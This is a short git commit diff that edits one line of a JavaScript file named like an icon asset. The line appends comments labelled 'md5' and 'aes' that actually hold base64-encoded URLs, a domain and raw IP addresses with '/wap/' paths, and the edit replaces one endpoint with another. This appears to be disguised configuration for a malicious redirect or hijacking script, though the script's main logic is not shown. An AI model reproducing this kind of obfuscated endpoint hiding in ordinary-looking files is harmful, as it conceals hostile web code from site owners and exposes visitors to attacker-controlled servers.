ced38abed8aedd58a3a9c137c8fa41f8f0bd7745
caocaodage <caocaodajun@gmail.com>
2021-09-02 12:33:34 +0800

    init

--- js/icon_4gwjtq.js
+++ js/icon_4gwjtq.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuc2lqam5mbnd3bmZzcnI2Lnh5ei93YXA/dj0y**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cDovLzEyMS40MC44NC4xMTY6ODAwOC93YXAv**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
